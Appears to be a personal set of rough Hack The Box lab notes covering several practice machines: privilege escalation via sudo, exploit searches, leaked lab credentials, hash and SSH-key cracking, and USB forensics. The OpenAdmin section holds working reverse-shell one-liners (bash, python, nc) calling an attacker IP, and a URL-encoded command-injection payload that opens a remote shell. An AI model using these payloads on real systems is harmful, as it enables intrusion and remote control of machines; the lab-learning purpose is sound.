@@ -1,0 +1,1221 @@
+www-data@bashed
+:/var/www/html/uploads# sudo -l
+
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+
+
+
+
+
+
+
+
+
+
+
+
+this means you can switch to  the user scriptmanager without passwd !! ^^ 
+
+
+$ sudo -u scriptmanager /bin/bash   # good luck   
+
+
+
+
+
+
+
+
+update locate command ==> $ sudo updatedb
+
+
+
+
+
+
+
+
+
+
+$ searchsploit ProFTPD 1.3.5
+
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                 | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                             | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                           | linux/remote/36742.tx
+
+$ linux/remote/49908.py
+
+
+
+
+
+
+
+==================================================
+# HTB :: Blocky 
+
+we find jar files ?? what can we do with them ??   Unpack them !! Extracting the Contents of a JAR File 
+https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html
+
+
+as a result we will get *.class files ??  what can we do with them ??  decompile them !! 
+http://www.javadecompilers.com
+
+
+
+
+
+
+
+GriefPrevention
+
+[
+    {
+        "modid": "griefprevention",
+        "name": "GriefPrevention",
+        "version": "3.1.1",
+        "description": "This plugin is designed to prevent all forms of grief.",
+        "url": "https://github.com/MinecraftPortCentral/GriefPrevention",
+        "dependencies": [
+            "spongeapi@6.0.0-SNAPSHOT-6ff094e"
+        ],
+        "requiredMods": [
+            "spongeapi@6.0.0-SNAPSHOT-6ff094e"
+        ]
+    }
+]
+
+
+public BlockyCore() {
+        this.sqlHost = "localhost";
+        this.sqlUser = "root";
+        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+    }
+
+
+
+Notch
+
+$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/   ============>  hashcat -a 0 -m 400 -o cracked.txt hash.txt rockyou.txt 		# phpass
+
+
+$dbpass='8YsqfCTnvxAUeduzjNSXe22';
+$dbuser='phpmyadmin';
+    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
+// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
+$cfg['Servers'][$i]['AllowNoPassword'] = false;
+$cfg['Servers'][$i]['AllowNoPassword'] = false;
+$cfg['Servers'][$i]['nopassword'] = false;
+$cfg['ShowChgPassword'] = true;
+	$pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
+	define('DB_PASSWORD', $pwd);
+	define('DB_USER', $uname);
+define('DB_PASSWORD', 'password_here');
+define('DB_USER', 'username_here');
+define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
+define('DB_USER', 'wordpress');
+
+
+
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'wordpress');
+define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
+define('DB_HOST', 'localhost');
+
+
+
+
+
+
+
+
+
+
+
+
+$ wpscan --url http://blocky.htb -e u                    
+
+ # -r u to enumerate users 
+
+
+
+
+
+
+
+
+
+
+Overall this box was easy but very frustrating I was over thinking it way too much. But the point it’s trying to get across is the dangers of password reuse. You should never use the same password on multiple accounts.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+================================================================================================================
+# TB :: Miarai
+
+
+PORT   STATE SERVICE 
+22/tcp open  ssh
+53/tcp open  domain   dnsmasq 2.76
+80/tcp open  http
+
+
+
+TL;DR  ===> too long; didn't read
+
+
+
+1 - Reflected Cross-site Scripting: A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of Origin header and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.
+2 - Session Fixation: Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.
+
+
+
+
+
+Raspbian is a free operating system based on Debian optimized for the Raspberry Pi
+
+
+
+
+
+
+
+I lost my original root.txt! I think I may have a backup on my USB stick...
+
+
+
+
+
+root@raspberrypi:/# sudo blkid
+/dev/sda2: LABEL="persistence" UUID="9a4604f7-d480-4c02-8332-ad0fc1916032" TYPE="ext4" PARTUUID="0eddfb88-02"
+/dev/sdb: UUID="635bcd7f-1d95-4229-bf13-3e722026db3c" TYPE="ext4"
+/dev/sda1: UUID="2016-12-13-15-39-36-00" LABEL="Debian jessie 20161213-13:58" TYPE="iso9660" PARTUUID="0eddfb88-01"
+/dev/loop0: TYPE="squashfs"
+
+
+
+
+
+
+
+
+
+root@raspberrypi:/# sudo fdisk -l
+
+Disk /dev/sdb: 10 MiB, 10485760 bytes, 20480 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disk /dev/sda: 10 GiB, 10737418240 bytes, 20971520 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x0eddfb88
+
+Device     Boot   Start      End  Sectors  Size Id Type
+/dev/sda1  *         64  2709119  2709056  1.3G 17 Hidden HPFS/NTFS
+/dev/sda2       2709504 20971519 18262016  8.7G 83 Linux
+
+Disk /dev/loop0: 1.2 GiB, 1297825792 bytes, 2534816 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+
+
+
+
+
+root@raspberrypi:/# lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   10G  0 disk 
+├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
+└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
+sdb      8:16   0   10M  0 disk /media/usbstick
+sr0     11:0    1 1024M  0 rom  
+loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
+
+
+
+
+
+
+
+root@raspberrypi:/# cd /media/usbstick
+
+root@raspberrypi:/media/usbstick# ls
+damnit.txt  lost+found
+
+root@raspberrypi:/media/usbstick# cat damnit.txt
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+
+-James
+
+root@raspberrypi:/media/usbstick# cat /root/root.txt
+I lost my original root.txt! I think I may have a backup on my USB stick...
+
+root@raspberrypi:/media/usbstick#
+
+
+
+
+
+Judging by the contents of the note, the deleted flag must be recovered. A quick check in
+lost+found​ gives no results, so other methods must be used.
+
+
+
+1. Strings !!! 
+
+$ sudo strings /dev/sdb​ 
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+>r &
+3d3e483143ff12ec505d026fa13e020b
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+-James
+
+
+
+
+
+
+
+Method 2 - Imaging and Recovery
+
+The command ​ 
+
+$ sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd​ 
+
+will create an image of the USB stick and save it to the ​ pi ​ user’s home directory.
+simple SCP from the attacking machine will suffice. The following command copies
+usb.dd to the local machine’s working directory: ​ 
+
+$ scp pi@10.10.10.48:/home/pi/usb.dd .										# copy files using scp and ssh creds 
+
+With the USB image at hand, it is possible to run a large range of tools against it to extract the
+data.
+
+
+### Forinsices 
+
+strings the drive to get the flag ^^  ==> the recovery tools didn't work  
+
+
+
+DD file is a disk image file and replica of a hard disk drive. 
+
+
+┌──(o54ma㉿o54ma)-[/tmp]
+└─$ file usb.dd            
+usb.dd: Linux rev 1.0 ext4 filesystem data, UUID=635bcd7f-1d95-4229-bf13-3e722026db3c (extents) (huge files)
+
+
+┌──(o54ma㉿o54ma)-[/tmp]
+└─$ binwalk --dd='.*' usb.dd
+
+
+
+
+
+
+Mounting the image: The mount command can be used to mount the image at the desired location (described as mountpoint):
+
+$ sudo mount -o loop usb.dd /mnt
+
+
+
+
+
+OOOOORRRRR there is online .dd file reader that was able to recover every thing => https://filext.com/file-extension/DD
+
+
+
+
+
+on my machine
+ 
+┌──(o54ma㉿o54ma)-[/tmp]
+└─$ lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
+sda      8:0    0  150G  0 disk 
+├─sda1   8:1    0  149G  0 part /
+├─sda2   8:2    0    1K  0 part 
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1 1024M  0 rom  
+
+
+
+
+
+
+
+
+
+================================================================================================================
+# HTB :: Beep 
+
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+111/tcp  open  rpcbind
+143/tcp  open  imap
+443/tcp  open  https
+993/tcp  open  imaps
+995/tcp  open  pop3s
+3306/tcp open  mysql
+
+
+
+
+
+smtp/smtps  : simple mail transfer protocol /  
+
+RPC : Remote procedure call
+
+POP : Post Office Protocol 
+
+
+
+$ searchsploit elastix  ===> LFI  
+
+
+
+root:eLaStIx. 2oo7				====> CMS def creds 
+
+admin:jEhdIekWmdjE
+
+
+
+gobuster with -k ==> no cert check 
+
+
+
+The machine is vulnerable to password reuse, AGGAAAAAAAAAAAAAAAINNNN !!! 
+
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+================================================================================================================
+HTB :: Secret !! 
+
+
+
+/api 	
+
+
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
+|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
+|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: DUMB Docs
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+3000/tcp open  http    Node.js (Express middleware)
+|_http-title: DUMB Docs
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+Designed with by Dasith Vidanage
+
+
+
+This is a API based Authentication system. we are using JWT tokens to make things more secure. to store the user data we are using mongodb
+	
+JWT tokens
+mongodb
+
+
+
+
+What is : ::: : API based authentication system
+
+
+
+
+Since a .git directory is included we can check the logs to find what changes were made on the code that
+could possibly give us a hint on were to look to move forward.
+
+$ git log -p 
+
+
+DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+
+
+
+if we got a token ,,, what can we do with it !! 
+
+
+
+
+
+router.get('/logs', verifytoken, (req, res) => {
++    const file = req.query.file;
++    const userinfo = { name: req.user }
++    const name = userinfo.name.name;
++    
++    if (name == 'theadmin'){
++        const getLogs = `git log --oneline ${file}`;
++        exec(getLogs, (err , output) =>{
++            if(err){
++                res.status(500).send(err);
++                return
++            }
++            res.json(output);
++        })
++    }
++    else{
++        res.json({
++            role: {
++                role: "you are normal user",
++                desc: userinfo.name.name
++            }
++        })
++    }
+ })
+ 
+ 
+ 
+ 
+ 
+reading files without sanitization !!!  
+ 
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+================================================================================================================
+HTB :: Validation 
+
+POST / HTTP/1.1
+Host: 10.10.11.116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://10.10.11.116
+Connection: close
+Referer: http://10.10.11.116/
+Upgrade-Insecure-Requests: 1
+
+username=osama&country=Brazil								##### WHat can i do here ???? ?? ? ? ? ? ??  ??  ? ?? ? ? 
+
+
+in each vector input !?  
+
+,5. SQLI 		
+1. SSTI / XXS 
+2. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+================================================================================================================
+HTB :: Nibbles 
+
+
+
+admin@nibbles.com
+
+
+
+
+we had to guess the passwd      admin:nibbles
+
+
+
+
+
+
+*] Started reverse TCP handler on 10.10.16.8:1234 
+[*] Sending stage (39282 bytes) to 10.10.10.75
+[+] Deleted image.php
+[*] Meterpreter session 1 opened (10.10.16.8:1234 -> 10.10.10.75:36692 ) at 2022-03-29 16:24:05 -0400
+ls
+
+meterpreter > ls
+Listing: /var/www/html/nibbleblog/content/private/plugins/my_image
+==================================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  258   fil   2022-03-29 16:29:37 -0400  db.xml
+
+
+
+
+
+
+
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'	
+
+
+
+
+
+
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l          
+
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+    
+    
+    
+    
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
+monitor.sh  os  who
+
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
+/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+
+
+Strange ..... since we can run monitor.sh ar root ... simply create a script with the same name and add /bin/bash inside it ,,,,, since we ccan write on it 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+================================================================================================================
+HTB :: OpenAdmin 
+
+by Alan Smith in Music
+
+
+
+2) website crawler software kali Linux ( skipfish
+
+skipfish -YO -o -d 2 ~/Desktop/folder http://192.168.x.x
+
+skipfish is included in kali linux and will spider a site for you (and can also test for various vulnerable parameters and configurations) – using the -O flag will tell skipifsh not to submit any forms, and -Y will tell skipfishn not to fuzz directories
+
+
+
+
+3) grabber
+
+grabber --spider 1 --sql --xss --url http://192.168.x.x
+
+grabber can spider and test for sqli and xss.
+It’s a very basic tool, and is only recommended for small sites.
+
+Features:
+
+Cross-Site Scripting
+SQL Injection (there is also a special Blind SQL Injection module)
+File Inclusion
+Backup files check
+Simple AJAX check (parse every JavaScript and get the URL and try to get the parameters)
+Hybrid analysis/Crystal ball testing for PHP application using PHP-SAT
+JavaScript source code analyzer: Evaluation of the quality/correctness of the JavaScript with JavaScript Lint
+Generation of a file [session_id, time(t)] for next stats analysis.
+
+
+
+
+5) httrack
+
+httrack http://192.168.x.x –O ~/Desktop/file
+
+httrack will mirror the site for you, by visiting and downloading every page that it can find. Sometimes this is a very useful option.
+
+
+
+6) burp suite
+
+Burpsuite has a spider built in, you can right-click on a request and ‘send to spider’
+
+
+
+
+7) wget -r
+
+wget -r http://192.168.x.x
+
+wget can recursively download a site (similar to httrack)
+
+
+
+
+
+
+
+
+
+
+
+$ skipfish -YO -d 2 -o /tmp/tmp1 -S /usr/share/skipfish/dictionaries/minimal.wl http://10.10.10.171/    ### Take a lot of time 
+
+$ skipfish -YO -d 2 -o /tmp/tmp1 http://10.10.10.171/music   # crawl each dir gobuster has found ... faster  
+
+
+$ cat /tmp/tmp1/pivots.txt
+
+GET http://10.10.10.171/ name=http://10.10.10.171/ type=serv linked=yes browsers=0 browser_used=FAST dup=0 code=200 len=10918 notes=2 sig=0xa8d9a3b3
+GET http://10.10.10.171/icons/ name=icons type=dir linked=yes browsers=0 browser_used=FAST dup=0 code=403 len=277 notes=2 sig=0xd74cfee3
+GET http://10.10.10.171/music/ name=music type=dir linked=yes browsers=0 browser_used=FAST dup=0 code=200 len=12554 notes=5 sig=0x2cb59890
+GET http://10.10.10.171/manual name=manual type=unknown linked=yes browsers=0 browser_used=FAST dup=0 returns_404 code=404 len=274 notes=0 sig=0xffdfffff
+GET http://10.10.10.171/ona name=ona type=unknown linked=yes browsers=0 browser_used=FAST dup=0 code=301 len=310 notes=1 sig=0x20d68c94
+
+┌──(o54ma㉿o54ma)-[/tmp/t]
+└─$ cat samples.js 
+var mime_samples = [
+  { 'mime': 'application/xhtml+xml', 'samples': [
+    { 'url': 'http://10.10.10.171/', 'dir': '_m0/0', 'linked': 2, 'len': 10918 },
+    { 'url': 'http://10.10.10.171/icons/', 'dir': '_m0/1', 'linked': 2, 'len': 277 },
+    { 'url': 'http://10.10.10.171/music/', 'dir': '_m0/2', 'linked': 2, 'len': 12554 },
+    { 'url': 'http://10.10.10.171/ona', 'dir': '_m0/3', 'linked': 2, 'len': 310 } ]
+  }
+];
+
+var issue_samples = [
+  { 'severity': 3, 'type': 40201, 'samples': [
+    { 'url': 'http://10.10.10.171/music/', 'extra': 'https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js', 'sid': '0', 'dir': '_i0/0' },
+    { 'url': 'http://10.10.10.171/music/', 'extra': 'https://oss.maxcdn.com/respond/1.4.2/respond.min.js', 'sid': '0', 'dir': '_i0/1' } ]
+  },
+  { 'severity': 1, 'type': 20102, 'samples': [
+    { 'url': 'http://10.10.10.171/icons/ubuntu-logo.png', 'extra': 'Child node limit exceeded', 'sid': '0', 'dir': '_i1/0' },
+    { 'url': 'http://10.10.10.171/icons/', 'extra': 'Recursion limit reached, not fuzzing', 'sid': '0', 'dir': '_i1/1' },
+    { 'url': 'http://10.10.10.171/music/img/favicon.ico', 'extra': 'Child node limit exceeded', 'sid': '0', 'dir': '_i1/2' },
+    { 'url': 'http://10.10.10.171/music/', 'extra': 'Recursion limit reached, not fuzzing', 'sid': '0', 'dir': '_i1/3' } ]
+  },
+  { 'severity': 1, 'type': 20101, 'samples': [
+    { 'url': 'http://10.10.10.171/ona/', 'extra': 'during node type checks', 'sid': '0', 'dir': '_i2/0' } ]
+  },
+  { 'severity': 0, 'type': 10803, 'samples': [
+    { 'url': 'http://10.10.10.171/music/', 'extra': '', 'sid': '0', 'dir': '_i3/0' } ]
+  },
+  { 'severity': 0, 'type': 10205, 'samples': [
+    { 'url': 'http://10.10.10.171/sfi9876', 'extra': '', 'sid': '0', 'dir': '_i4/0' } ]
+  },
+  { 'severity': 0, 'type': 10202, 'samples': [
+    { 'url': 'http://10.10.10.171/', 'extra': 'Apache/2.4.29 (Ubuntu)', 'sid': '0', 'dir': '_i5/0' } ]
+  }
+];
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+OR See the report in the browser ::
+
+file:///tmp/tmp2/index.html
+
+
+
+
+
+
+
+
+
+
+
+
+How crawlers works ?? 
+https://portswigger.net/burp/documentation/scanner/crawling
+
+
+
+bash -c "bash -i >& /dev/udp/10.10.16.8/1234 0>&1"
+
+bash -i >& /dev/tcp/10.10.16.8/1234 0>&1
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.8",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+nc 10.10.16.8 1234
+
+
+bash -i >& /dev/tcp/10.10.16.8/1234 0>&1
+
+
+
+
+
+always to fit a payload in burp encode it as url format 
+
+%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%38%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66
+
+
+
+xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E1;+echo+\"BEGIN\";%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%38%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66;echo\"END\"&xajaxargs[]=ping
+
+
+
+
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/var/log/syslog                                                                                                                                                            
+/var/log/journal/44bf1480ab2c456192be5f80ba18261f/system.journal
+/var/log/kern.log
+/var/log/ona.log
+/var/log/auth.log
+
+
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config                                                                                                                                             
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+
+
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                
+Sudoers file: /etc/sudoers.d/joanna is readable                                                                                                                            
+joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
+
+
+	sudo -u joanna /bin/nano /opt/priv
+
+
+
+
+
+
+
+
+mysecretbindpassword
+
+array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+      
+      
+      
+      
+      
+NOOOOOOOOOOTE :::::: connecting to mysql server through nc shell won't work most of the time ^^  =======> butf works with ssh connections       
+      
+      
+ssh jimmy@10.10.10.171
+
+
+FU**ing password reuse !!!! 
+
+with the above database   
+      
+      
+      
+jimmy@openadmin:/home$ id
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
+
+
+
+
+
+
+
+jimmy@openadmin:/var/www/internal$ cat main.php
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+
+
+
+can we run a php file from the terminal !??? .... we can 
+
+$ php main.php 
+cat: /home/joanna/.ssh/id_rsa: Permission denied
+
+    
+
+
+Looking at the /etc/apache2/sites-enabled/internal.conf conﬁguration ﬁle reveals that the
+internal virtual host is running as joanna on localhost port 52846 .
+
+
+Listen 127.0.0.1:52846
+
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+<IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+
+
+
+
+
+
+##### WHat is happenning up there ?? 
+
+	1. even if you changed the /etc/hosts to "10.10.10.171 internal.openadmin.htb" , you sitill won't be able to access the virtual host !! since the bind address with this service is only the loopback ^^ 
+	2. so we can access it by port forwarding 
+		victim@openadmin $ ssh -R 1337:127.0.0.1:52846 root@10.10.14.2					ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
+	3. or by curling locally from the victim machine .
+		
+
+
+
+
+
+
+if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+              }
+
+
+
+let's crack the hash   ==> crack station 
+
+
+passwd :: Revealed
+
+
+
+
+
+
+The application can be accessed remotely through SSH port forwarding.
+
+
+OR inside the victim box ==> it can access to that virtual host
+$ curl http://127.0.0.1:52846/main.php
+
+
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+
+
+
+
+
+┌──(o54ma㉿o54ma)-[/tmp]
+└─$ locate *2john
+/usr/sbin/bitlocker2john
+/usr/sbin/dmg2john
+/usr/sbin/gpg2john
+/usr/sbin/hccap2john
+/usr/sbin/keepass2john
+/usr/sbin/putty2john
+/usr/sbin/racf2john
+/usr/sbin/rar2john
+/usr/sbin/uaf2john
+/usr/sbin/vncpcap2john
+/usr/sbin/wpapcap2john
+/usr/sbin/zip2john
+
+
+
+
+$ ssh joanna@10.10.10.171 -i /tmp/id_rsa 
+Enter passphrase for key '/tmp/id_rsa':
+
+
+
+
+Crack the Key
+
+$ /usr/share/john/ssh2john.py key > hash 
+$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+
+
+
+
+
+what we learned ?? 
+
+1. the log/confg files to be checked ?? apache, var, DB, services ??  
+	* ls /etc/apache2/sites-enabled/
+
+
+	accessable conf
+	<VirtualHost *:80>
+		# The ServerName directive sets the request scheme, hostname and port that
+		# the server uses to identify itself. This is used when creating
+		# redirection URLs. In the context of virtual hosts, the ServerName
+		# specifies what hostname must appear in the request's Host: header to
+		# match this virtual host. For the default virtual host (this file) this
+		# value is not decisive as it is used as a last resort host regardless.
+		# However, you must set it for any further virtual host explicitly.
+		ServerName openadmin.htb
+
+		ServerAdmin jimmy@openadmin.htb
+		DocumentRoot /var/www/html
+
+		# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+		# error, crit, alert, emerg.
+		# It is also possible to configure the loglevel for particular
+		# modules, e.g.
+		#LogLevel info ssl:warn
+
+		ErrorLog ${APACHE_LOG_DIR}/error.log
+		CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+		# For most configuration files from conf-available/, which are
